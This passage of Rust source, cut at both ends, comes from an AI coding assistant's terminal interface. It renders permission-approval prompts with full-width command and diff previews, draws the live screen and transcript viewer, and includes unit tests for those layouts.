    let mut spans = line.spans.into_iter();
    let mut lines: Vec<Line<'static>> = spans.next().into_iter().map(Line::from).collect();
    for note in spans {
        let text = note.content.trim_start().to_string();
        lines.extend(
            crate::tui::chat::wrap(&text, inner)
                .into_iter()
                .map(|row| Line::from(Span::styled(row, note.style))),
        );
    }
    lines
}

/// Option `index` of a prompt, wrapped under its number rather than cut:
/// the user is choosing what it says, a scope's full path included.
fn option_lines(index: usize, option: &str, chosen: bool, inner: usize) -> Vec<Line<'static>> {
    let marker = if chosen { "❯ " } else { "  " };
    let style = if chosen {
        Style::default()
            .fg(theme::ACCENT)
            .add_modifier(Modifier::BOLD)
    } else {
        Style::default()
    };
    let number = format!("{}. ", index + 1);
    let indent = marker.chars().count() + number.chars().count();
    crate::tui::chat::wrap(option, inner.saturating_sub(indent))
        .into_iter()
        .enumerate()
        .map(|(row, text)| {
            let (lead, label) = if row == 0 {
                (marker.to_string(), format!("{number}{text}"))
            } else {
                (" ".repeat(indent), text)
            };
            Line::from(vec![
                Span::styled(lead, Style::default().fg(theme::ACCENT)),
                Span::styled(label, style),
            ])
        })
        .collect()
}

/// `submit_job` / `delete-dataset` / `createDashboard` → `Submit job`.
pub fn humanize(action: &str) -> String {
    let mut words: Vec<String> = Vec::new();
    let mut word = String::new();
    let mut previous_lower = false;
    for ch in action.chars() {
        let boundary = ch == '_' || ch == '-' || ch == ' ';
        if (boundary || (ch.is_uppercase() && previous_lower)) && !word.is_empty() {
            words.push(std::mem::take(&mut word));
        }
        if !boundary {
            word.extend(ch.to_lowercase());
        }
        previous_lower = ch.is_lowercase();
    }
    if !word.is_empty() {
        words.push(word);
    }
    let sentence = words.join(" ");
    let mut chars = sentence.chars();
    match chars.next() {
        Some(first) => first.to_uppercase().chain(chars).collect(),
        None => "Approve action".to_string(),
    }
}

/// A server action's input, already pretty JSON, cut to a few rows.
/// Wrapped, never cut at the edge: the user is approving what these lines
/// say (a hook's command, a server action), so the end of a long line must
/// not be hidden.
fn action_preview_lines(preview: &str, width: usize) -> Vec<Line<'static>> {
    let wrapped: Vec<String> = preview
        .lines()
        .flat_map(|line| crate::tui::chat::wrap_indented(line, width))
        .collect();
    let total = wrapped.len();
    let mut lines: Vec<Line<'static>> = wrapped
        .into_iter()
        .take(MAX_ACTION_ROWS)
        .map(|l| Line::from(Span::styled(l, theme::muted())))
        .collect();
    if total > MAX_ACTION_ROWS {
        lines.push(Line::from(Span::styled(
            format!("… +{} lines", total - MAX_ACTION_ROWS),
            theme::muted(),
        )));
    }
    lines
}

/// One row of a command, script or tool input in an approval prompt: the
/// gutter (`$ `, a line number, or blanks where a line wraps) and its text.
struct PreviewRow {
    gutter: String,
    text: String,
}

/// `text` wrapped to `width` behind a gutter: `lead(i)` on the first row of
/// line `i`, `continued` on the rows it wraps onto. Nothing is cut at the
/// edge: the user approves what these rows say, so the end of a long line
/// must stay visible.
fn gutter_rows(
    text: &str,
    width: usize,
    lead: impl Fn(usize) -> String,
    continued: &str,
) -> Vec<PreviewRow> {
    let text = text.replace('\t', "    ");
    text.split('\n')
        .enumerate()
        .flat_map(|(i, line)| {
            let lead = lead(i);
            let room = width.saturating_sub(lead.width());
            crate::tui::chat::wrap_indented(line, room)
                .into_iter()
                .enumerate()
                .map(move |(row, text)| PreviewRow {
                    gutter: if row == 0 {
                        lead.clone()
                    } else {
                        continued.to_string()
                    },
                    text,
                })
        })
        .collect()
}

/// The rows of a preview shown with a gutter (a command, a script, a local
/// tool's input, a page to fetch), and the style of their text. `None` for
/// prompts shown another way (edits, server actions, trust).
fn gutter_preview(access: Access, preview: &str, width: usize) -> Option<(Vec<PreviewRow>, Style)> {
    let bold = Style::default().add_modifier(Modifier::BOLD);
    match access {
        Access::Command => {
            let lead = |i| if i == 0 { "$ " } else { "  " }.to_string();
            Some((gutter_rows(preview, width, lead, "  "), bold))
        }
        Access::Script => {
            let lead = |i| format!("{:>3} │ ", i + 1);
            Some((
                gutter_rows(preview, width, lead, "    │ "),
                Style::default(),
            ))
        }
        Access::Read | Access::Folder | Access::Fetch | Access::LocalTool => Some((
            gutter_rows(preview, width, |_| String::new(), ""),
            theme::muted(),
        )),
        Access::Write | Access::ServerAction | Access::Install | Access::Trust => None,
    }
}

/// Whether the prompt box has room for only part of the request's
/// preview, so it must be printed in full above the box.
pub fn preview_is_cut(request: &PermissionRequest, width: usize) -> bool {
    request
        .preview
        .as_deref()
        .and_then(|preview| gutter_preview(request.access, preview, prompt_inner(width)))
        .is_some_and(|(rows, _)| rows.len() > MAX_PREVIEW_ROWS)
}

/// Text columns inside the prompt box on a screen `width` wide.
fn prompt_inner(width: usize) -> usize {
    width.saturating_sub(4).max(10)
}

fn capped_preview(
    rows: Vec<PreviewRow>,
    style: Style,
    preview: &str,
    syntax: Option<&'static syntect::parsing::SyntaxReference>,
    cap: usize,
) -> Vec<Line<'static>> {
    let hidden = rows.len().saturating_sub(cap);
    let shown = &rows[..rows.len() - hidden];
    let texts: Vec<&str> = shown.iter().map(|row| row.text.as_str()).collect();
    let styled = crate::code_ui::code_preview::styled_rows(preview, syntax, &texts, style);
    let mut lines: Vec<Line<'static>> = shown
        .iter()
        .zip(styled)
        .map(|(row, runs)| {
            let mut spans = vec![Span::styled(row.gutter.clone(), theme::muted())];
            spans.extend(runs.into_iter().map(|(t, s)| Span::styled(t, s)));
            Line::from(spans)
        })
        .collect();
    if hidden > 0 {
        lines.push(Line::from(Span::styled(
            format!("… +{hidden} lines; all of it is printed above"),
            theme::muted(),
        )));
    }
    lines
}

fn preview_lines(
    access: Access,
    preview: Option<&str>,
    summary: &str,
    width: usize,
    cap: usize,
) -> Vec<Line<'static>> {
    if matches!(
        access,
        Access::ServerAction | Access::Install | Access::Trust
    ) {
        return preview
            .map(|p| action_preview_lines(p, width))
            .unwrap_or_default();
    }
    let Some(preview) = preview else {
        // Reads have no preview: show the call the way the transcript will.
        let tool = summary.split_whitespace().next().unwrap_or_default();
        let label = crate::code_ui::labels::label(tool, summary);
        let mut spans = vec![Span::styled(
            label.verb,
            Style::default().add_modifier(Modifier::BOLD),
        )];
        if !label.target.is_empty() {
            let room = width.saturating_sub(10);
            spans.push(Span::raw(format!("({})", items::fit(&label.target, room))));
        }
        return vec![Line::from(spans)];
    };
    if let Some((rows, style)) = gutter_preview(access, preview, width) {
        let syntax = crate::code_ui::code_preview::syntax(access, summary);
        return capped_preview(rows, style, preview, syntax, cap);
    }
    // The box drops the scrollback indent, so its columns go to the text.
    items::diff_block_capped(preview, width + items::DIFF_INDENT.len(), cap)
        .into_iter()
        .map(|line| {
            // The box adds its own margin; drop the scrollback indent.
            let mut spans = line.spans;
            if let Some(first) = spans.first_mut() {
                first.content = first.content.trim_start().to_string().into();
            }
            Line::from(spans)
        })
        .collect()
}

/// Wraps lines in a rounded border `inner` columns wide.
fn boxed(body: Vec<Line<'static>>, inner: usize) -> Vec<Line<'static>> {
    let border = theme::border(true);
    let mut out = vec![Line::from(Span::styled(
        format!("╭{}╮", "─".repeat(inner + 2)),
        border,
    ))];
    for line in body {
        // A row that would push the right edge out is cut instead.
        let line = fit::fit_line(line, inner);
        let used = line.width();
        let mut spans = vec![Span::styled("│ ", border)];
        spans.extend(line.spans);
        spans.push(Span::raw(" ".repeat(inner.saturating_sub(used))));
        spans.push(Span::styled(" │", border));
        out.push(Line::from(spans));
    }
    out.push(Line::from(Span::styled(
        format!("╰{}╯", "─".repeat(inner + 2)),
        border,
    )));
    out
}

/// Draws the Ctrl+O transcript full screen: everything expanded, scrolled
/// and searched by the open [`transcript::Viewer`].
pub fn draw_transcript(frame: &mut Frame, state: &mut UiState) {
    let area = frame.area();
    let width = area.width as usize;
    state.transcript_width = width;
    let lines = transcript::lines(&state.transcript_items(), width);
    let total = lines.len();
    let Some(viewer) = state.viewer.as_mut() else {
        return;
    };
    viewer.height = area.height.saturating_sub(1) as usize;
    viewer.clamp(total);
    let query = if viewer.editing {
        String::new()
    } else {
        viewer.query.clone()
    };
    let visible: Vec<Line<'static>> = lines
        .into_iter()
        .skip(viewer.scroll)
        .take(viewer.height)
        .map(|line| {
            let text: String = line.spans.iter().map(|s| s.content.as_ref()).collect();
            if !query.is_empty() && text.to_lowercase().contains(&query.to_lowercase()) {
                transcript::highlight(&text, &query)
            } else {
                line
            }
        })
        .collect();
    let body = Rect::new(area.x, area.y, area.width, viewer.height as u16);
    frame.render_widget(Paragraph::new(visible), body);
    let footer = Rect::new(area.x, area.bottom().saturating_sub(1), area.width, 1);
    frame.render_widget(Paragraph::new(viewer.footer(total)), footer);
}

/// Renders the whole live region into the frame.
pub fn draw_live(frame: &mut Frame, state: &mut UiState) {
    let area = frame.area();
    let width = area.width as usize;
    // Only drawing knows how wide and tall the prompt box can be, so this
    // is where a preview too long for it gets printed in full above.
    let prompt_box = state
        .prompt
        .as_ref()
        .map(|prompt| prompt_lines_within(prompt, width, area.height as usize));
    let cut_for_height = prompt_box.as_ref().is_some_and(|(_, cut)| *cut);
    if cut_for_height
        || state
            .prompt
            .as_ref()
            .is_some_and(|prompt| preview_is_cut(&prompt.request, width))
    {
        state.list_prompt_preview();
    }
    let mut activity = activity_lines(state, width);
    let below_height = below_height(state, width) as u16;
    // When space is short, keep the newest activity lines.
    let room = area.height.saturating_sub(below_height) as usize;
    if activity.len() > room {
        activity.drain(..activity.len() - room);
    }
    let activity: Vec<Line<'static>> = activity
        .into_iter()
        .map(|line| fit::fit_line(line, width))
        .collect();
    let top = Rect::new(area.x, area.y, area.width, activity.len() as u16);
    frame.render_widget(Paragraph::new(activity), top);
    let mut y = top.bottom();
    let boxed_lines = match (&state.prompt, &state.query, &state.picker) {
        (Some(_), _, _) => prompt_box.map(|(lines, _)| lines),
        (None, Some(view), _) => Some(query_lines(view, width)),
        (None, None, Some(picker)) => Some(picker_lines_within(
            picker,
            state,
            width,
            area.bottom().saturating_sub(y) as usize,
        )),
        _ => None,
    };
    if let Some(lines) = boxed_lines {
        let rect = Rect::new(
            area.x,
            y,
            area.width,
            (lines.len() as u16).min(area.bottom().saturating_sub(y)),
        );
        frame.render_widget(Paragraph::new(lines), rect);
        return;
    }
    let rule = || Paragraph::new(Line::from(Span::styled("─".repeat(width), theme::muted())));
    if y < area.bottom() {
        frame.render_widget(rule(), Rect::new(area.x, y, area.width, 1));
        y += 1;
    }
    let rows = input_rows(state) as u16;
    let rows = rows.min(area.bottom().saturating_sub(y));
    if rows > 0 {
        let prefix: Vec<Line> = (0..rows)
            .map(|i| match i {
                0 => Line::from(crate::code_ui::input_render::marker(state)),
                _ => Line::from("  "),
            })
            .collect();
        frame.render_widget(Paragraph::new(prefix), Rect::new(area.x, y, 2, rows));
        let editor = Rect::new(area.x + 2, y, area.width.saturating_sub(2), rows);
        fit_placeholder(state, editor.width as usize);
        frame.render_widget(&state.input, editor);
        y += rows;
    }
    if y < area.bottom() {
        frame.render_widget(rule(), Rect::new(area.x, y, area.width, 1));
        y += 1;
    }
    let custom = custom_status_lines(state, width);
    if !custom.is_empty() && y < area.bottom() {
        frame.render_widget(Paragraph::new(custom), Rect::new(area.x, y, area.width, 1));
        y += 1;
    }
    let agents: Vec<Line<'static>> = subagent_lines(state, width)
        .into_iter()
        .map(|line| fit::fit_line(line, width))
        .collect();
    let agent_rows = (agents.len() as u16).min(area.bottom().saturating_sub(y));
    if agent_rows > 0 {
        frame.render_widget(
            Paragraph::new(agents),
            Rect::new(area.x, y, area.width, agent_rows),
        );
        y += agent_rows;
    }
    let footer = footer_lines(state, width);
    let height = (footer.len() as u16).min(area.bottom().saturating_sub(y));
    frame.render_widget(
        Paragraph::new(footer),
        Rect::new(area.x, y, area.width, height),
    );
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::assistant::{AssistantEvent, PermissionRequest};
    use crate::code_ui::approver::{Ask, Mode};
    use ratatui::backend::TestBackend;
    use ratatui::Terminal;
    use std::sync::{Arc, Mutex};

    fn screen(state: &mut UiState, width: u16) -> String {
        let height = live_height(state, width, 40);
        let mut terminal = Terminal::new(TestBackend::new(width, height)).unwrap();
        terminal.draw(|f| draw_live(f, state)).unwrap();
        let buffer = terminal.backend().buffer().clone();
        (0..buffer.area.height)
            .map(|y| {
                (0..buffer.area.width)
                    .map(|x| buffer[(x, y)].symbol().to_string())
                    .collect::<String>()
                    .trim_end()
                    .to_string()
            })
            .collect::<Vec<_>>()
            .join("\n")
    }

    fn state() -> UiState {
        UiState::new(Arc::new(Mutex::new(Mode::Ask)))
    }

    #[test]
    fn only_menus_and_the_shortcuts_list_count_as_pop_up_rows() {
        use crate::code_ui::state::test_support::type_text;
        let mut s = state();
        assert_eq!(pop_up_rows(&s, 80), 0, "the input box at rest");
        let resting = live_height(&s, 80, 40);
        type_text(&mut s, "/");
        let open = live_height(&s, 80, 40);
        assert!(open > resting);
        assert_eq!(pop_up_rows(&s, 80), open - resting, "the '/' menu");
        s.input = crate::code_ui::state::new_input();
        s.show_shortcuts = true;
        assert!(pop_up_rows(&s, 80) > 0, "the shortcuts list");
    }

    #[test]
    fn reasoning_shows_one_thinking_line_not_two() {
        let mut s = state();
        s.start_turn("plan it");
        s.apply(AssistantEvent::Thinking("Look at the schema.".into()));
        let shown = screen(&mut s, 40);
        assert_eq!(shown.matches("Thinking").count(), 1, "{shown}");
        assert!(shown.contains("Working"), "{shown}");
    }

    #[test]
    fn footer_shows_context_fill_and_new_conversations_clear_it() {
        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        let mut s = state();
        let context = |tokens| crate::cmd::stream::ContextUsage {
            tokens: Some(tokens),
            window: 200_000,
            auto_compact_at: 170_000,
            history: None,
        };
        s.apply(AssistantEvent::Context(context(50_000)));
        assert!(screen(&mut s, 100).contains("·  120k until auto-compact"));
        s.apply(AssistantEvent::Context(context(166_000)));
        assert!(screen(&mut s, 100).contains("·  4k until auto-compact"));
        for key in "/new".chars().map(KeyCode::Char).chain([KeyCode::Enter]) {
            s.on_key(KeyEvent::new(key, KeyModifiers::NONE));
        }
        assert_eq!(s.usage.context, None, "a new conversation starts empty");
        assert!(!screen(&mut s, 100).contains("auto-compact"));
    }

    #[test]
    fn a_resumed_conversation_shows_the_auto_compact_figure_from_its_first_turn() {
        use crate::assistant::history::{Message, Speaker, Transcript};
        let mut s = state();
        let transcript = Transcript {
            title: Some("earlier".into()),
            messages: vec![
                Message::new(Speaker::You, "earlier ask"),
                Message::new(Speaker::Gz, "earlier answer"),
            ],
        };
        s.show_history("earlier", Ok(transcript));
        // The stored messages carry no context size, so nothing is shown
        // until the server reports one.
        assert!(!screen(&mut s, 100).contains("auto-compact"));
        s.start_turn("next");
        s.apply(AssistantEvent::Context(crate::cmd::stream::ContextUsage {
            tokens: Some(50_000),
            window: 200_000,
            auto_compact_at: 170_000,
            history: None,
        }));
        s.apply(AssistantEvent::Done(crate::assistant::TurnEnd::Completed));
        assert!(screen(&mut s, 100).contains("·  120k until auto-compact"));
    }

    #[test]
    fn messages_typed_while_working_show_gray_with_where_they_stand() {
        let mut s = state();
        s.start_turn("fix the tests");
        s.notes_sent(vec![crate::assistant::steering::SentNote {
            steer_id: "steer_1".into(),
            text: "use python".into(),
        }]);
        s.queue.push_back("look at @src/main.rs".into());
        let out = screen(&mut s, 100);
        assert!(
            out.contains("› use python  sent · gz reads it at its next step"),
            "{out}"
        );
        assert!(
            out.contains("› look at @src/main.rs  queued · sends after this turn"),
            "{out}"
        );
        assert!(out.contains("2 waiting · ctrl+enter sends now"), "{out}");
    }

    #[test]
    fn a_narrow_status_line_drops_low_priority_parts_then_ends_in_an_ellipsis() {
        let mut s = state();
        s.apply(AssistantEvent::Context(crate::cmd::stream::ContextUsage {
            tokens: Some(50_000),
            window: 200_000,
            auto_compact_at: 170_000,
            history: None,
        }));
        s.queue.push_back("later".into());
        let wide = screen(&mut s, 100);
        assert!(
            wide.contains("? for shortcuts  ·  120k until auto-compact  ·  1 queued"),
            "{wide}"
        );
        let narrow = screen(&mut s, 40);
        let status = narrow.lines().last().unwrap();
        assert_eq!(status, "  120k until auto-compact  ·  1 queued");
        let tiny = screen(&mut s, 20);
        let status = tiny.lines().last().unwrap();
        assert_eq!(status, "  1 queued");
    }

    #[test]
    fn the_command_menu_scrolls_past_ten_rows_and_says_where_it_is() {
        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        let mut s = state();
        s.on_key(KeyEvent::new(KeyCode::Char('/'), KeyModifiers::NONE));
        let total = s.command_menu().len();
        assert!(total > MAX_MENU_ROWS);
        let out = screen(&mut s, 40);
        let marked = out
            .lines()
            .filter(|l| l.starts_with("  ❯ ") || l.starts_with("    /"))
            .count();
        assert_eq!(marked, MAX_MENU_ROWS, "{out}");
        assert!(
            out.contains(&format!("1 of {total}")) || out.contains('…'),
            "{out}"
        );
        for line in out.lines() {
            assert!(line.width() <= 40, "{line}");
        }
    }

    #[test]
    fn the_custom_status_line_sits_under_the_input_and_is_cut_to_fit() {
        let mut s = state();
        s.custom_status = Some(Shown::Line("main · $0.19 · 12% context".into()));
        let out = screen(&mut s, 40);
        let rows: Vec<&str> = out.lines().collect();
        let input = rows.iter().position(|r| r.starts_with("› ")).unwrap();
        assert_eq!(rows[input + 2], "  main · $0.19 · 12% context", "{out}");
        s.custom_status = Some(Shown::Failed(
            "status line: timed out after 3s · /statusline off turns it off".into(),
        ));
        let out = screen(&mut s, 40);
        assert!(
            out.contains("  status line: timed out after 3s · /st…"),
            "{out}"
        );
        s.custom_status = None;
        assert!(!screen(&mut s, 40).contains("status line"));
    }

    #[test]
    fn at_forty_columns_long_live_lines_end_in_an_ellipsis() {
        let mut s = state();
        s.start_turn("fix the tests");
        let out = screen(&mut s, 40);
        let tip = out.lines().find(|l| l.contains("Tip:")).unwrap();
        assert!(tip.ends_with('…'), "{out}");
        assert!(
            out.contains("›  Ask gz to read, explain, or change t…"),
            "{out}"
        );
        assert!(out.lines().all(|l| l.width() <= 40), "{out}");
    }

    #[test]
    fn idle_shows_input_box_and_hint() {
        for width in [80, 120] {
            let mut s = state();
            let out = screen(&mut s, width);
            assert!(out.contains("› "), "{out}");
            assert!(out.contains("? for shortcuts"), "{out}");
            assert!(out.lines().next().unwrap().starts_with("───"));
        }
    }

    #[test]
    fn busy_shows_streaming_text_spinner_and_mode() {
        let mut s = state();
        *s.mode.lock().unwrap() = Mode::AcceptEdits;
        s.start_turn("hi");
        s.apply(AssistantEvent::Text("Working on **it**".into()));
        s.apply(AssistantEvent::ToolStarted {
            name: "read_file".into(),
            summary: "read_file src/a.rs".into(),
            local: true,
        });
        assert!(
            s.flush
                .contains(&Item::Assistant("Working on **it**".into())),
            "text before a tool call moves to scrollback"
        );
        s.apply(AssistantEvent::Text("Still **going**".into()));
        for width in [80, 120] {
            let out = screen(&mut s, width);
            assert!(out.contains("● Still going"), "{out}");
            assert!(out.contains("● Read(src/a.rs)"), "{out}");
            assert!(out.contains("esc to interrupt"), "{out}");
            assert!(
                out.contains("⏵⏵ accept edits on (shift+tab to cycle)"),
                "{out}"
            );
        }
    }

    #[test]
    fn the_spinner_says_gz_waits_for_you_while_a_prompt_is_open() {
        let mut s = state();
        s.start_turn("x");
        let (tx, _rx) = tokio::sync::oneshot::channel();
        s.open_prompt(Ask {
            request: PermissionRequest {
                access: Access::Command,
                summary: "run_command make".into(),
                preview: Some("make".into()),
                chat_scope: "this command".into(),
                always_scope: None,
                action: None,
                asked_by: None,
                target: None,
                note: None,
            },
            reply: tx,
            background: None,
        });
        for width in [40, 80] {
            let out = screen(&mut s, width);
            assert!(out.contains("Waiting for you"), "{out}");
            assert!(!out.contains("esc to interrupt"), "{out}");
        }
    }

    #[test]
    fn the_spinner_says_gz_is_reconnecting_until_the_stream_is_back() {
        let mut s = state();
        s.start_turn("x");
        s.apply(AssistantEvent::Reconnecting(
            "connection lost (reset); reconnecting in 1s (try 1 of 6)…".into(),
        ));
        for width in [40, 80] {
            let out = screen(&mut s, width);
            assert!(out.contains("Reconnecting…"), "{out}");
            assert!(out.contains("connection lost"), "{out}");
            assert!(out.contains("esc to"), "esc still stops it: {out}");
        }
        s.apply(AssistantEvent::Text("back".into()));
        let out = screen(&mut s, 80);
        assert!(!out.contains("Reconnecting"), "{out}");
    }

    #[test]
    fn edit_prompt_shows_diff_question_and_options() {
        let mut s = state();
        let (tx, _rx) = tokio::sync::oneshot::channel();
        s.open_prompt(Ask {
            request: PermissionRequest {
                access: Access::Write,
                summary: "edit_file src/math.rs".into(),
                preview: Some("--- a/src/math.rs\n+++ b/src/math.rs\n@@ -1,2 +1,2 @@\n fn a() {}\n-fn b() {}\n+fn c() {}\n".into()),
                chat_scope: "all edits this session".into(),
                always_scope: Some("always scope".into()),
            action: None,
                asked_by: None,
                target: None,
                note: None,
            },
            reply: tx,
            background: None,
        });
        let narrow = screen(&mut s, 40);
        assert!(
            narrow.contains("│ Do you want to make this edit to     │"),
            "{narrow}"
        );
        assert!(narrow.contains("│ src/math.rs?"), "{narrow}");
        for line in narrow.lines() {
            assert!(!line.starts_with('│') || line.ends_with('│'), "{narrow}");
        }
        for width in [80, 120] {
            let out = screen(&mut s, width);
            assert!(out.contains("Edit file"), "{out}");
            assert!(out.contains("2 - fn b() {}"), "{out}");
            assert!(out.contains("2 + fn c() {}"), "{out}");
            assert!(
                out.contains("Do you want to make this edit to src/math.rs?"),
                "{out}"
            );
            assert!(out.contains("❯ 1. Yes"), "{out}");
            assert!(out.contains("2. Yes, for this chat"), "{out}");
            assert!(out.contains("3. Yes, always"), "{out}");
            assert!(
                out.contains("4. No, and tell gz what to do differently (n)"),
                "{out}"
            );
        }
    }

    fn write_prompt(s: &mut UiState, old: Option<&str>) {
        let (tx, _rx) = tokio::sync::oneshot::channel();
        let diff = crate::assistant::tools::unified_diff("notes.md", old, "# Notes\nfirst\n");
        s.open_prompt(Ask {
            request: PermissionRequest {
                access: Access::Write,
                summary: "write_file notes.md".into(),
                preview: Some(diff),
                chat_scope: "all edits this session".into(),
                always_scope: Some("always scope".into()),
                action: None,
                asked_by: None,
                target: None,
                note: None,
            },
            reply: tx,
            background: None,
        });
    }

    #[test]
    fn a_write_that_creates_a_file_asks_to_create_it() {
        let mut s = state();
        write_prompt(&mut s, None);
        let out = screen(&mut s, 80);
        assert!(out.contains("Create file"), "{out}");
        assert!(out.contains("Do you want to create notes.md?"), "{out}");
        assert!(!out.contains("Edit file"), "{out}");
    }

    #[test]
    fn a_write_over_an_existing_file_still_asks_to_edit_it() {
        let mut s = state();
        write_prompt(&mut s, Some("# Notes\n"));
        let out = screen(&mut s, 80);
        assert!(out.contains("Edit file"), "{out}");
        assert!(
            out.contains("Do you want to make this edit to notes.md?"),
            "{out}"
        );
    }

    #[test]
    fn an_edit_prompt_taller_than_the_screen_keeps_its_question_and_options() {
        let mut diff = String::from("--- a/big.rs\n+++ b/big.rs\n@@ -1,40 +1,40 @@\n");
        for i in 0..20 {
            diff.push_str(&format!("-    let v{i} = {i};\n"));
        }
        for i in 0..20 {
            diff.push_str(&format!("+    let v{i} = {};\n", i * 2));
        }
        let mut s = state();
        let (tx, _rx) = tokio::sync::oneshot::channel();
        s.open_prompt(Ask {
            request: PermissionRequest {
                access: Access::Write,
                summary: "edit_file big.rs".into(),
                preview: Some(diff),
                chat_scope: "all edits in this chat".into(),
                always_scope: Some("always scope".into()),
                action: None,
                asked_by: None,
                target: None,
                note: None,
            },
            reply: tx,
            background: None,
        });
        for (width, height) in [(80u16, 24u16), (40, 14)] {
            let mut terminal = Terminal::new(TestBackend::new(width, height)).unwrap();
            terminal.draw(|f| draw_live(f, &mut s)).unwrap();
            let buffer = terminal.backend().buffer().clone();
            let out: String = (0..height)
                .map(|y| {
                    (0..width)
                        .map(|x| buffer[(x, y)].symbol().to_string())
                        .collect::<String>()
                        + "\n"
                })
                .collect();
            let flat = squeezed(&out);
            assert!(flat.contains("Doyouwanttomakethisedit"), "{out}");
            assert!(flat.contains("4.No"), "{out}");
            assert!(out.contains('╰'), "bottom border shows: {out}");
        }
        let listed = s.flush.iter().any(|item| {
            matches!(item, Item::Panel(panel) if format!("{panel:?}").contains("let v19 = 38"))
        });
        assert!(listed, "the whole diff is printed above the cut prompt");
    }

    #[test]
    fn a_narrow_edit_prompt_shows_the_whole_changed_line() {
        let mut s = state();
        let (tx, _rx) = tokio::sync::oneshot::channel();
        s.open_prompt(Ask {
            request: PermissionRequest {
                access: Access::Write,
                summary: "edit_file src/main.rs".into(),
                preview: Some(
                    "--- a/src/main.rs\n+++ b/src/main.rs\n@@ -2 +2 @@\n\
                     -    let total: u32 = (1..=10).sum();\n\
                     +    let total: u64 = (1..=10).product();\n"
                        .into(),
                ),
                chat_scope: "all edits in this chat".into(),
                always_scope: Some("always scope".into()),
                action: None,
                asked_by: None,
                target: None,
                note: None,
            },
            reply: tx,
            background: None,
        });
        let out = screen(&mut s, 40);
        let flat = squeezed(&out);
        assert!(flat.contains("product()"), "{out}");
        assert!(flat.contains(".sum()"), "{out}");
        for line in out.lines().filter(|l| l.starts_with('│')) {
            assert!(line.ends_with('│') && line.width() == 40, "{out}");
        }
    }

    /// The prompt's text with box borders and spaces gone, so a scope
    /// wrapped across rows reads as one string.
    fn squeezed(out: &str) -> String {
        out.chars()
            .filter(|c| !c.is_whitespace() && !"│╭╮╰╯─❯".contains(*c))
            .collect()
    }

    #[test]
    fn a_script_edit_prompt_reads_cleanly_and_shows_its_whole_scope() {
        let folder = "~/code/a-rather-long-project-folder-name/services/billing-api";
        for width in [40u16, 60, 120] {
            let mut s = state();
            let (tx, _rx) = tokio::sync::oneshot::channel();
            s.open_prompt(Ask {
                request: PermissionRequest {
                    access: Access::Write,
                    summary: "edit_file src/math.rs".into(),
                    preview: Some(
                        "--- a/src/math.rs\n+++ b/src/math.rs\n@@ -1 +1 @@\n-a\n+b\n".into(),
                    ),
                    chat_scope: "all edits in this chat".into(),
                    always_scope: Some(format!("all edits in {folder}")),
                    action: Some(crate::assistant::permissions::FROM_SCRIPT.into()),
                    asked_by: Some("a-subagent-with-a-long-name".into()),
                    target: Some("src/math.rs".into()),
                    note: None,
                },
                reply: tx,
                background: None,
            });
            let out = screen(&mut s, width);
            assert!(!out.contains("wants to"), "{out}");
            assert!(out.contains("from a script"), "{out}");
            let flat = squeezed(&out);
            assert!(
                flat.contains("Doyouwanttomakethisedittosrc/math.rs?"),
                "{out}"
            );
            assert!(
                flat.contains(&format!("3.Yes,always(alleditsin{folder})")),
                "{out}"
            );
            for line in out.lines() {
                assert!(
                    unicode_width::UnicodeWidthStr::width(line) <= width as usize,
                    "wider than {width}: {line:?}"
                );
            }
        }
    }

    fn subagent_started(id: &str, name: &str) -> AssistantEvent {
        AssistantEvent::Subagent(crate::subagents::SubagentEvent::Started {
            id: id.into(),
            name: name.into(),
            profile: Some("analyst".into()),
            agent_id: None,
            task: None,
            runs_on: Default::default(),
            parent: None,
        })
    }

    #[test]
    fn a_subagent_page_shows_tabs_title_and_its_work() {
        use crate::subagents::SubagentEvent;
        let mut s = state();
        s.start_turn("check");
        for (id, name) in [("sa_1", "Schema"), ("sa_2", "Lineage")] {
            s.apply(AssistantEvent::Subagent(SubagentEvent::Started {
                id: id.into(),
                name: name.into(),
                profile: Some("analyst".into()),
                agent_id: None,
                task: Some(format!("Describe the {name} of orders")),
                runs_on: Default::default(),
                parent: None,
            }));
        }
        s.apply(AssistantEvent::Subagent(SubagentEvent::Text {
            id: "sa_2".into(),
            text: "Tracing upstream jobs.".into(),
        }));
        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        s.on_key(KeyEvent::new(KeyCode::Up, KeyModifiers::SHIFT));
        let mut terminal = Terminal::new(TestBackend::new(90, 16)).unwrap();
        terminal.draw(|f| draw_agent_page(f, &mut s)).unwrap();
        let buffer = terminal.backend().buffer().clone();
        let out: Vec<String> = (0..buffer.area.height)
            .map(|y| {
                (0..buffer.area.width)
                    .map(|x| buffer[(x, y)].symbol().to_string())
                    .collect::<String>()
                    .trim_end()
                    .to_string()
            })
            .collect();
        println!("{}", out.join("\n"));
        assert!(out[0].contains("main") && out[0].contains("Schema") && out[0].contains("Lineage"));
        assert!(out[1].contains("Task(Lineage · analyst)"), "{out:?}");
        let body = out.join("\n");
        assert!(body.contains("Describe the Lineage of orders"));
        assert!(body.contains("Tracing upstream jobs."));
        assert!(
            !body.contains("Describe the Schema"),
            "only this subagent's work"
        );
        assert!(out.last().unwrap().contains("esc back to main"));
    }

    #[test]
    fn queued_background_subagents_show_under_the_running_ones() {
        let mut s = state();
        s.subagent_settings.max_concurrent = Some(1);
        for id in ["sa_a", "sa_b"] {
            s.apply(AssistantEvent::SubagentRequested(
                crate::subagents::SubagentRequest {
                    id: id.into(),
                    name: format!("Check {id}"),
                    profile: "analyst".into(),
                    prompt: "look".into(),
                    model: None,
                    reasoning_effort: None,
                    context_tokens: Some(200_000),
                },
            ));
        }
        s.apply(subagent_started("sa_a", "Check sa_a"));
        let out = screen(&mut s, 100);
        let running = out.find("Task(Check sa_a").expect("running row");
        let queued = out
            .find("◦ Task(Check sa_b · analyst · 200K)  queued")
            .unwrap_or_else(|| panic!("queued row: {out}"));
        assert!(queued > running, "{out}");
    }

    #[test]
    fn a_child_that_finished_first_stays_under_its_running_parent() {
        use crate::subagents::{Status, SubagentEvent};
        let mut s = state();
        s.start_turn("compare");
        s.apply(subagent_started("sa_p", "Schema"));
        s.apply(AssistantEvent::Subagent(SubagentEvent::Started {
            id: "sa_c".into(),
            name: "Columns".into(),
            profile: None,
            agent_id: None,
            task: None,
            runs_on: Default::default(),
            parent: Some("sa_p".into()),
        }));
        s.apply(AssistantEvent::Subagent(SubagentEvent::Finished {
            id: "sa_c".into(),
            status: Status::Completed,
            summary: "12 columns".into(),
            usage: Default::default(),
